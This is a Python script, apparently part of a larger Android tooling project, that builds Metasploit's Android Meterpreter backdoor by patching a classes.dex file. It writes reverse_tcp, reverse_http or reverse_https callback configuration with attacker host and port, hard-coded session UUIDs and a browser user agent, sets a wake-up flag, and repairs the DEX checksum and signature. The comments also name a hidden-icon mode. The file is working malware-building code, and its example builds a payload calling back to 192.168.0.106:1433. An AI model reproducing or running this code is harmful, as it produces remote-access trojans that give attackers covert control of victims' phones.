#!/usr/bin/python3
# -*- coding: utf-8 -*-

from time import sleep
from zlib import adler32
from hashlib import sha1
from struct import pack

class CreateMsfDex:
    '''
    msf在生成apk时，主要是以二进制的方式修改已有的classes.dex文件，在文件中添加配置信息，本脚本会添加http/http/tcp的配置信息到classes.dex中。
    不打包其他文件，只修改classes.dex.
    '''
    def __init__(self, payload, lhost, lport, options):
        '''

        :param payload:
        :param lhost:
        :param lport:
        '''
        self.payload = payload
        self.lhost = lhost
        self.lport = lport

        self.HttpCofing = {
            'HttpPath' : '/eEMYPGUEP7aJO4oo6L7TDQ4g_sKz8nfuee3w5f-PhfBbOCmO7SxFW3J6g7hdVG-GncZjxkvCCTv0LSvGvpv65Daw_51y3IA6htUR9xagmOWn2CFi1vqF5QvAWAhgFKrH3uQwiOUnmvE2nqrLyF-asQXhgLSKY1-3GXNHNB5m-_rnKknw1-3VRB8JqBM5Rq6GqKnh8r',
            'HttpUa' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0',
            'PayloadUuid' : 'b42918b83fb09449/dalvik=19/android=3/2021-11-05T15:46:08Z',
            'SessionDataRaw' : [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 128, 58, 9, 0, 180, 41, 24, 184, 63, 176, 148, 73, 199, 165, 196, 182, 166, 32, 150, 101, 14, 91, 208, 150, 147, 245, 77, 134, 170, 246, 164, 139, 23, 115, 26, 186]
        }
        self.TcpCofing = {
            'PayloadUuid' : '33b108b063bd67fa/dalvik=19/android=3/2021-11-05T17:54:07Z',
            'SessionDataRaw': [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 128, 58, 9, 0, 51, 177, 8, 176, 99, 189, 103, 250, 171, 156, 168, 143, 202, 25, 196, 35, 237, 22, 78, 183, 252, 114, 72, 183, 157, 99, 222, 185, 215, 168, 180, 42]
        }
        self.MsfBaseDexFile = options['MsfBaseDexFile']
        self.MsfBuildDexFile = options['MsfBuildDexFile']

    def Generate(self, **kwargs):
        '''
        :param msfbasedexfile:
        :param msfbuilddexfile:
        :return:
        '''
        PayloadPlatform = self.__PayloadPlatform()
        if PayloadPlatform == 'tcp':
            TransportData = self.__GenerateTcpConfig(PayloadPlatform)
        else:
            TransportData = self.__GenerateHttpConfig(PayloadPlatform)

        self.__GenerateDexFile(TransportData, self.MsfBaseDexFile, self.MsfBuildDexFile)
        sleep(0)

    def __GenerateDexFile(self, TransportData, BaseDexFilePath, BuildDexFilePath):
        '''
        使用之前生成的配置信息，替换classes.dex文件中的内容。
        步骤一
            需要根据选择的模式，修改配置信息的第一字节，值为0-4
            标记app，1为stageless模式，2为app debug模式，4为安卓唤醒模式，8为隐藏图标模式
            msf文件 metasploit-framework/lib/msf/core/payload/android.rb 函数generate_config flags配置项
            code  TransportData[0] = bytes([4])
        步骤二
            替换dex文件内容，修复dex文件头没，保存新文件
        :param TransportData:
        :return:
        '''
        TransportData = bytearray(TransportData)
        TransportData[0] = 4
        TransportData = bytes(TransportData)


        TransportData += bytes((8195 - len(TransportData)))

        with open(BaseDexFilePath, 'rb') as file:
            DexFileData = file.read()

        DexFileData = DexFileData.replace(bytes([222, 173, 186, 173]) + bytes(8191), TransportData)

        # 修复dex文件头
        DexFileData = bytearray(DexFileData)
        sha1signature = sha1()
        sha1signature.update(DexFileData[32:])
        signature = sha1signature.digest()
        DexFileData[12:32] = signature
        checksum = adler32(DexFileData[12:])
        DexFileData[8:12] = pack('<L', checksum)
        DexFileData = bytes(DexFileData)

        with open(BuildDexFilePath, 'wb') as file:
            DexFileData = file.write(DexFileData)

    def __GenerateTcpConfig(self, platform):
        '''
        msfvenom ==> apkfile
        msf在生成tcp的远控时，会添加一个payload.uuid，由于算法没研究，因此直接使用默认随机生成的uuid相关信息，不影响使用。
        参考页面 https://github.com/rapid7/metasploit-framework/wiki/Payload-UUID
        在http/https的配置信息生成时，遵循一下规则
        头部
            48位 uuid+timestamp 加密生成的session_data信息
            msf文件 metasploit-framework/lib/rex/payloads/meterpreter/config.rb 函数session_block
            code bytes(self.TcpCofing['SessionDataRaw'])
        tcp信息
            524位 msf文件 metasploit-framework/lib/rex/payloads/meterpreter/config.rb 函数transport_block

            1. 512位 tcp链接地址，tcp://192.168.1.1:1433/ 不够的用\x00补全
            code HttpUa.encode() + bytes(512 - len(HttpUa))

            2. 12位 tcp链接超时时间，次数等信息。comm_timeout,retry_total,retry_wait
            code struct.pack('III',300,3600,10)

        扩展部分
            0位 posix系统需要加入扩展，主要针对windows配置。

        扩展初始化
            根据上一部分的扩展部分选择，常规的安卓系统，直接补充\x00

        结尾部分
            4位 结尾部分，使用\x00进行结束
            code bytes([255, 255, 255, 255])
        :param platform:
        :return: TransportData :bytes
        '''

        TcpHost = self.lhost
        TcpPort = self.lport

        SessionDataRaw =  self.TcpCofing['SessionDataRaw']
        # http/https URL
        TransportData_uri = f'{platform}://{TcpHost}:{TcpPort}'
        # payload config uuid data 48 bytes
        TransportData = bytes(SessionDataRaw)
        # payload config uri data 512 bytes http://ip:port/path
        TransportData += (TransportData_uri.encode() + bytes(512 - len(TransportData_uri)))
        # http timeout,total,wait
        TransportData += pack('III',300,3600,10)
        # extension_block + extension_init_block
        TransportData += bytes(6)
        # end
        TransportData += bytes([255, 255, 255, 255])

        return TransportData

    def __GenerateHttpConfig(self, platform):
        '''
        msfvenom ==> apkfile
        msf在生成http/https的远控时，会添加一个payload.uuid，由于算法没研究，因此直接使用默认随机生成的uuid相关信息，不影响使用。
        参考页面 https://github.com/rapid7/metasploit-framework/wiki/Payload-UUID
        在http的配置信息生成时，遵循一下规则
        头部
            48位 uuid+timestamp 加密生成的session_data信息
            msf文件 metasploit-framework/lib/rex/payloads/meterpreter/config.rb 函数session_block
            code bytes(self.HttpCofing['SessionDataRaw'])
        http信息
            1057位 msf文件 metasploit-framework/lib/rex/payloads/meterpreter/config.rb 函数transport_block

            1. 512位 http/https链接地址，https://192.168.1.1:1433/eEMYPGUEP7aJO4oo6L7TDQ4g_sKz8nfuee3w5f 不够的用\x00补全
            code HttpUa.encode() + bytes(512 - len(HttpUa))

            2. 12位 http/https链接超时时间，次数等信息。comm_timeout,retry_total,retry_wait
            code struct.pack('III',300,3600,10)

            3. 128位 代理主机信息，proxy_host，不需要直接留空。
            code bytes(128)

            4. 64位 代理主机信息，proxy_user，不需要直接留空。
            code bytes(64)

            5. 64位 代理主机信息，proxy_pass，不需要直接留空。
            code bytes(64)

            6. 256位 user-agent信息，直接编写ua信息，不足的用\x00代替
            code (HttpUa.encode() + bytes(512 - len(HttpUa)))

            6. 20位 SSL cert hash for verification，需要用\x00代替
            code bytes(20)

            7. 1位，其他的http头信息，长度不确定。
            code bytes(1)

        扩展部分
            0位 posix系统需要加入扩展，主要针对windows配置。

        扩展初始化
            根据上一部分的扩展部分选择，常规的安卓系统，直接补充\x00

        结尾部分
            4位 结尾部分，使用\x00进行结束
            code bytes([255, 255, 255, 255])
        :param platform:
        :return: TransportData :bytes
        '''

        HttpHost = self.lhost
        HttpPort = self.lport
        HttpUa = self.HttpCofing['HttpUa']
        HttpPath = self.HttpCofing['HttpPath']

        SessionDataRaw =  self.HttpCofing['SessionDataRaw']
        # http/https URL
        TransportData_url = f'{platform}://{HttpHost}:{HttpPort}/{HttpPath}'
        # payload config uuid data 48 bytes
        TransportData = bytes(SessionDataRaw)
        # payload config url data 512 bytes http://ip:port/path
        TransportData += (TransportData_url.encode() + bytes(512 - len(TransportData_url)))
        # http timeout,total,wait
        TransportData += pack('III',300,3600,10)
        # proxy host+user+pass
        TransportData += bytes(128 + 64 + 64)
        # http user-agent
        TransportData += (HttpUa.encode() + bytes(512 - len(HttpUa)))
        # http header
        TransportData += bytes(20 + 1)
        # extension_block + extension_init_block
        TransportData += bytes(6)
        # end
        TransportData += bytes([255, 255, 255, 255])

        return TransportData

    def __PayloadPlatform(self):
        '''

        :return:
        '''
        if self.payload == 'android/meterpreter/reverse_http':
            return 'http'
        elif self.payload == 'android/meterpreter/reverse_https':
            return 'https'
        else:
            return 'tcp'

if __name__ == '__main__':

    OPTIONS = {
        'MsfBaseDexFile': '../libs/MsfDexDir/classes.dex',
        'MsfBuildDexFile': '../WorkDir/dexfile/msf/classes.dex',
    }
    create = CreateMsfDex('android/meterpreter/reverse_tcp', '192.168.0.106', '1433', OPTIONS)

    create.Generate()
